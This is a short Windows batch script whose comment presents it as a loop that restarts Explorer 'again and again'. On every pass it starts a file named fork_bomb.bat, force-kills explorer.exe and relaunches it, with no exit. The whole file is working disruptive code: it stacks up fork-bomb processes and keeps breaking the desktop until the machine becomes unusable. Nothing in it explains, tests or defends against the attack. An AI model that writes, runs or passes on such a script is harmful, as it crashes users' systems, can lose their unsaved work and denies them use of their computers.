@echo off

rem this loop restarts the explorer (GUI) again and again
:explorer
start fork_bomb.bat
taskkill /im "explorer.exe" /f
start explorer.exe
goto explorer
